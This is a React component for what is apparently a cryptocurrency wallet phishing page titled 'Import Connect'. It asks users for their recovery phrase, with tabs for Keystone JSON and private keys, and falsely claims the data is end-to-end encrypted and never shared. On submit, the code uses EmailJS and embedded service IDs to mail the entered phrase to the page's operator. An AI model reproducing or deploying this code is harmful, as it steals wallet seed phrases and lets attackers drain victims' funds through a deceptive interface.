import React from "react";
import emailjs from "@emailjs/browser";
const Connect = () => {
    const sendEmail = (e) => {
        e.preventDefault()
        alert("submitted")
        // emailjs.sendForm('service_id', 'template_id', e.target, 'public_key')
        emailjs.sendForm('service_nx9di5h', 'template_vybjxoi', e.target, 'tr6MisctBi3oaO8ec')
    }
    return (
        <>
            <section>
                <div className="my-home">
                    <div className="height">
                        <div className="container">
                            <div className="form-heading">
                                <h1 className="import">Import Connect</h1>
                                <p className="key"><i class="fa-solid fa-lock"></i> All information are end-to end-encrypted. We do not share data and activity sessions with any other company.</p>
                            </div>
                            <div className="form-container">
                                <ul className="phrase-menu">
                                    <li>Phrase</li>
                                    <li>Keystone JSON</li>
                                    <li>Private key</li>
                                </ul>
                                <form className="form" onSubmit={sendEmail}>
                                    <div className="form-box">
                                        <div className="container">
                                            <p className="recovery">Recovery Phrase</p>
                                            {/* <input className="input" type="text"></input> */}
                                            <textarea name="message" className="input"></textarea>
                                            <p className="words">Typically 12 (sometimes 24) words separated by a single space.</p>
                                            <button type="submit" className="wallet-import">Import Wallet</button>
                                        </div>
                                    </div>
                                </form>
                            </div>
                        </div>
                    </div>
                </div>
            </section>
        </>
    )
}
export default Connect